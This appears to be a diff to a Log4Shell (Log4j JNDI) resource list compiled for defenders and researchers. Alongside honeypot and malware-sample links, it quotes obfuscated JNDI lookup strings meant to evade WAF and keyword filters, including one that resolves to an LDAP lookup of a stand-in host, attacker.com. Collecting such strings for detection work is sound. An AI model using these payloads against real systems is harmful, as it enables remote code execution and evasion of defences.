@@ -34,7 +34,8 @@
 | https://samples.vx-underground.org/samples/Families/Log4J%20Malware/ | Driveby Malware Samples (Password: infected) |
 
 ### Public Honeypots
-
+| URL | Info |
+| --- | --- |
 | https://isc.sans.edu/api/webhoneypotreportsbyua/jndi | SANS jndi |
 
 ### Payloads / Obfuscation / WAF Bypass
@@ -44,6 +45,7 @@
 | https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a | log4j-keywords |
 
 https://twitter.com/Rezn0k/status/1469523006015750146?s=09
+
 If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you: 
 ```c
 ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
@@ -51,6 +53,7 @@ ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
 // attacker.com/a} This gets past every filter I've found so far. There's no shortage of these bypasses.
 
 https://twitter.com/ymzkei5/status/1469765165348704256?s=09
+
 There may be many ways to avoid detection :_(
 ```c
 jn${env::-}di: jn${date:}di${date:':'} j${k8s:k5:-ND}i${sd:k5:-:} j${main:\k5:-Nd}i${spring:k5:-:} j${sys:k5:-nD}${lower:i${web:k5:-:}} j${::-nD}i${::-:} j${EnV:K5:-nD}i: j${loWer:Nd}i${uPper::}
